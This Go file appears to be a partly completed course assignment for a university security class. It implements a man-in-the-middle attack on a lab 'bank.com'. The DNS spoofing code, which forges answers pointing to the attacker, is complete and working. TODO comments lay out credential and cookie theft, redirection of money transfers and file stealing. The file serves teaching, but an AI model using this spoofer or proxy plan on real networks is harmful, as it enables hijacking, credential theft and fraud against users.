// +build linux

/*
EECS 388 Project 3
Part 3. Man-in-the-Middle Attack

mitm.go
When completed (by you!) and compiled, this program will:
- Intercept and spoof DNS questions for bank.com to instead direct
the client towards the attacker's IP.
- Act as an HTTP proxy, relaying the client's requests to bank.com
and sending bank.com's response back to the client... but with an evil twist.

The segments left to you to complete are marked by TODOs. It may be useful
to search for them within this file. Lastly, don't dive blindly into coding
this part. READ THE STARTER CODE! It is documented in detail for a reason.
*/

// TODO #0: Read through this code in its entirety, to understand its
//          structure and functionality.

package main

// These are the imports we used, but feel free to use anything from
// gopacket or the Go standard libraries. DO NOT import other third-party
// libraries, as your code may fail to compile on the autograder.
import (
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"fmt"

	eecs388p3 "bank.com/mitm/network" // For `eecs388p3.` methods
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/sys/unix"
)

// ==============================
//  DNS MITM PORTION
// ==============================

func startDNSServer() {

	if handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever); err != nil {
		log.Panic(err)
	} else if err := handle.SetBPFFilter("udp"); err != nil { // filter to just the UDP traffic
		// More on BPF filtering:
		// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
		log.Panic(err)
	} else {
		defer handle.Close() // we are deferring closing the stream until we are done looping
		// Loop over each packet received
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleDNS(pkt)
		}
	}
}

/*
	handleDNS detects DNS packets and sends a spoofed DNS response as appropriate.

	Parameters: packet, a packet captured on the network, which may or may not be DNS.
*/
func handleDNS(packet gopacket.Packet) {

	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
	udpLayer := packet.Layer(layers.LayerTypeUDP)

	// Manually extract the payload of the UDP layer and parse it as DNS.
	payload := udpLayer.(*layers.UDP).Payload
	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)

	intercept := dnsIntercept{}
	
	// get the Src and Dst Ports from the UDP layer object
	srcPort := udpLayer.(*layers.UDP).SrcPort
	dstPort := udpLayer.(*layers.UDP).DstPort
	intercept.SrcPort = srcPort
	intercept.DstPort = dstPort

	// get the SRC and DESTINATION IP addresses from the ip layer
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	ipLayerData := ipLayer.(*layers.IPv4)
	
	intercept.ClientIP = ipLayerData.SrcIP
	fmt.Println("client ip is: " + intercept.ClientIP.String())
	intercept.DestinationIP = ipLayerData.DstIP

	// Check if the UDP packet contains a DNS packet within.
	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {

		// Type-switch the layer to the correct interface in order to operate on its member variables.
		dnsData, _ := dnsLayer.(*layers.DNS)

		dnsQuestions := dnsData.Questions
		dnsAnswers := dnsData.Answers
		fmt.Print("dns questions: ")
		fmt.Println(dnsQuestions)
		
		hasBankCom := false
		for i := 0; i < len(dnsQuestions); i++ {
			dnsQuestion := dnsQuestions[i]
			fmt.Print("dns question 0: ")
			fmt.Println(dnsQuestion)
			if dnsQuestion.Type == 1 {
				name := dnsQuestion.Name
				str := ""
				for j := 0; j < len(name); j++ {
					ascii := name[j]
					character := string(ascii)
					str += character
				}
				if str == "bank.com" {
					// send a spoofed response
					fmt.Println("found bank.com!!!!!")
					hasBankCom = true
					break
				}
			}
		}

		hasNoAnswer := true
		for i := 0; i < len(dnsAnswers); i++ {
			dnsAnswer := dnsAnswers[i]
			fmt.Print("their answer: ")
			fmt.Println(dnsAnswer)
			name := dnsAnswer.Name
			str := ""
			for j := 0; j < len(name); j++ {
				ascii := name[j]
				character := string(ascii)
				str += character
			}
			if str == "bank.com" {
				// send a spoofed response
				fmt.Println("found answer to bank.com!!!!! :(")
				hasNoAnswer = false
				break
			}
		}

		if hasBankCom && hasNoAnswer {
			byteName := []byte("bank.com")
			intercept.Name = byteName
			castPayload := gopacket.Payload(payload)
			dnsAnswer := spoofDNS(intercept, castPayload)
			srcPortInt := int(srcPort)
			sendRawUDP(srcPortInt, ipLayerData.SrcIP, dnsAnswer)
		}

		// TODO #1: When the client queries bank.com, send a spoofed response.
		//          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
		//
		// Hint:    Parse dnsData, then search for an exact match of "bank.com". To do
		//          this, you may have to index into an array; make sure its
		//          length is non-zero before doing so!
		//
		// Hint:    In addition, you don't want to respond to your spoofed
		//          response as it travels over the network, so check that the
		//          DNS packet has no answer (also stored in an array).
		//
		// Hint:    Because the payload variable above is a []byte, you may find
		//          this line of code useful when calling spoofDNS, since it requires
		//          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
	}
}

/*
	dnsIntercept stores the pertinent information from a captured DNS packet
	in order to craft a response in spoofDNS.
*/
type dnsIntercept struct {
	Name []byte
	ClientIP net.IP
	DestinationIP net.IP
	SrcPort layers.UDPPort
	DstPort layers.UDPPort
	// TODO #2: Determine what needs to be intercepted from the DNS request
	//          for bank.com in order to craft a spoofed answer.

}

/*
	spoofDNS is called by handleDNS upon detection of a DNS request for "bank.com". Your goal is to
	make a packet that seems like it came from the genuine DNS server, but
	instead lies to the client that bank.com is at the attacker's IP address.

	Parameters:
	- intercept, a struct containing information from the original DNS request packet
	- payload, the application (DNS) layer from the original DNS request.

	Returns: the spoofed DNS answer packet as a slice of bytes.
*/
func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
	// In order to make a packet containing the spoofed DNS answer, we need
	// to start from layer 3 of the OSI model (IP) and work upwards, filling
	// in the headers of the IP, UDP, and finally DNS layers.

	// TODO #3: Fill in the missing fields below to construct the base layers of
	//          your spoofed DNS packet. If you are confused about what the Protocol
	//          variable means, Google and IANA are your friends!
	ip := &layers.IPv4{
		// bank.com operates on IPv4 exclusively.
		Version:  4,
		
		Protocol: layers.IPProtocolUDP,
		SrcIP:    intercept.DestinationIP,
		DstIP:    intercept.ClientIP,
	}
	udp := &layers.UDP{
		SrcPort: intercept.DstPort,
		DstPort: intercept.SrcPort,
	}

	// The checksum for the level 4 header (which includes UDP) depends on
	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
	// inside IPv4.
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		log.Panic(err)
	}
	// As long as payload contains DNS layer data, we can convert the
	// sequence of bytes into a DNS data structure.
	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).
		Layer(layers.LayerTypeDNS)
	dns, ok := dnsPacket.(*layers.DNS)
	if !ok {
		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
	}

	// TODO #4: Populate the DNS layer (dns) with an answer.
	//          Your business-minded friends may have dropped some hints elsewhere in the network!
	ipAddressString := eecs388p3.GetLocalIP()
	fmt.Println("attacker IP : " + ipAddressString)
	ipAddress, _, _ := net.ParseCIDR(ipAddressString)

	dns.QR = true
	dns.ANCount = 1
	dns.ResponseCode = layers.DNSResponseCodeNoErr

	var dnsAnswer layers.DNSResourceRecord
	dnsAnswer.Type = layers.DNSTypeA
	dnsAnswer.IP = ipAddress
	
	dnsAnswer.DataLength = 4
	dnsAnswer.Data = ipAddress.To4()
	dnsAnswer.Name = intercept.Name
	dnsAnswer.Class = layers.DNSClassIN

	dns.Answers = append(dns.Answers, dnsAnswer)

	fmt.Print("our answer: ")
	fmt.Println(dnsAnswer)


	// Now we're ready to seal off and send the packet.
	// Serialization refers to "flattening" a packet's different layers into a
	// raw stream of bytes to be sent over the network.
	// Here, we want to automatically populate length and checksum fields with the correct values.
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
	sendRawUDP is a helper function that sends bytes over UDP to the target host/port
	combination.

	Parameters:
	- port, the destination port.
	- dest, destination IP address.
	- toSend - the raw packet to send over the wire.

	Returns: None

*/
func sendRawUDP(port int, dest net.IP, toSend []byte) {
	// Opens an IPv4 socket to destination host/port.
	outFD, _ := unix.Socket(unix.AF_INET, unix.SOCK_RAW,
		unix.IPPROTO_RAW)
	var destArr [4]byte
	copy(destArr[:], dest.To4())
	addr := unix.SockaddrInet4{
		Port: port,
		Addr: destArr,
	}
	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic(err)
	}
	if err := unix.Close(outFD); err != nil {
		log.Panic(err)
	}
}

// ==============================
//  HTTP MITM PORTION
// ==============================

/*
	startHTTPServer sets up a simple HTTP server to masquerade as bank.com, once DNS spoofing is successful.
*/
func startHTTPServer() {
	http.HandleFunc("/", handleHTTP)
	log.Panic(http.ListenAndServe(":80", nil))
}

/*
	handleHTTP is called every time an HTTP request arrives and handles the backdoor
	connection to the real bank.com.

	Parameters:
	- rw, a "return envelope" for data to be sent back to the client;
	- r, an incoming message from the client
*/
func handleHTTP(rw http.ResponseWriter, r *http.Request) {

	if r.URL.Path == "/kill" {
		os.Exit(1)
	}

	// TODO #5: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
	//          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
	//          and use this function for the more general tasks that remain, like stealing cookies
	//          and actually communicating over the network.
	//
	// Hint:    You will want to create an http.Client object to deliver the spoofed
	//          HTTP request, and to capture the real bank.com's response.
	//
	// Hint:    Make sure to check for cookies in both the request and response!
}

/*
	spoofBankRequest creates the request that is actually sent to bank.com.

	Parameters:
	- origRequest, the request received from the bank client.

	Returns: The spoofed packet, ready to be sent to bank.com.
*/
func spoofBankRequest(origRequest *http.Request) *http.Request {
	var bankRequest *http.Request
	var bankURL = "http://" + eecs388p3.GetBankIP() + origRequest.RequestURI

	if origRequest.URL.Path == "/login" {

		// TODO #6: Since the client is logging in,
		//          - parse the request's form data,
		//          - steal the credentials,
		//          - make a new request, leaving the values untouched
		//
		// Hint:    Once you parse the form (Google is your friend!), the form
		//          becomes a url.Values object. As a consequence, you cannot
		//          simply reuse origRequest, and must make a new request.
		//          However, url.Values supports member functions Get(), Set(),
		//          and Encode(). Encode() URL-encodes the form data into a string.
		//
		// Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
		//          You can wrap the URL-encoded form data into a Reader with the
		//          strings.NewReader() function.

	} else if origRequest.URL.Path == "/logout" {

		// Since the client is just logging out, don't do anything major here
		bankRequest, _ = http.NewRequest("POST", bankURL, nil)

	} else if origRequest.URL.Path == "/transfer" {

		// TODO #7: Since the client is transferring money,
		//			- parse the request's form data
		//          - if the form has a key named "to", modify it to "Jensen"
		//          - make a new request with the updated form values

	} else {
		// Silently pass-through any unidentified requests
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
	}

	// Also pass-through the same headers originally provided by the client.
	bankRequest.Header = origRequest.Header
	return bankRequest
}

/*
	writeClientResponse forms the HTTP response to the client, making in-place modifications
	to the response received from the real bank.com.

	Parameters:
	- bankResponse, the response from the bank
	- origRequest, the original request from the client
	- writer, the interface where the response is constructed

	Returns: the same ResponseWriter that was provided (for daisy-chaining, if needed)
*/
func writeClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {

	// Pass any cookies set by bank.com on to the client.
	if len(bankResponse.Cookies()) != 0 {
		for _, cookie := range bankResponse.Cookies() {
			http.SetCookie(*writer, cookie)
		}
	}

	if origRequest.URL.Path == "/transfer" {

		// TODO #8: Use the original request to change the recipient back to the
		//          value expected by the client.
		//
		// Hint:    Unlike an http.Request object which uses an io.Reader object
		//          as the body, the body of an http.Response object is an io.ReadCloser.
		//          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
		//          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
		//
		// Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
		//          /login endpoint, where you could wrap a string in an io.Reader.

	} else if origRequest.URL.Path == "/download" {

		// TODO #9: Steal any files sent by bank.com (using eecs388p3.StealFile), while also preserving them for the client response.
		//
		// Hint:    mime.ParseMediaType() will parse a response header into a map
		//          of key-value pairs. If you don't know which header contains
		//          the filename of an attachment, Google is your friend!
		//
		// Hint:    io.TeeReader() copies the contents of an io.Reader into an
		//          io.Writer. One fact which is now important is that io.Reader
		//          io.Writer are interfaces! As long as a data type supports a
		//          Read() method, it is compatible with functions that take in an
		//          io.Reader. The same is true for data types with a Write() method
		//          and io.Writer.
		//
		// Hint:    io.ReadCloser is the union of io.Reader and io.Closer interfaces, so
		//          it can be passed as an argument to io.TeeReader(). eecs388.StealFile()
		//          returns *os.File, but the os.File type has a Write() method!
	}

	// Now that all changes are complete, write the body
	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
		log.Fatal(err)
	}

	return writer
}

func main() {

	// The DNS server is run concurrently as a goroutine
	go startDNSServer()

	startHTTPServer()
}
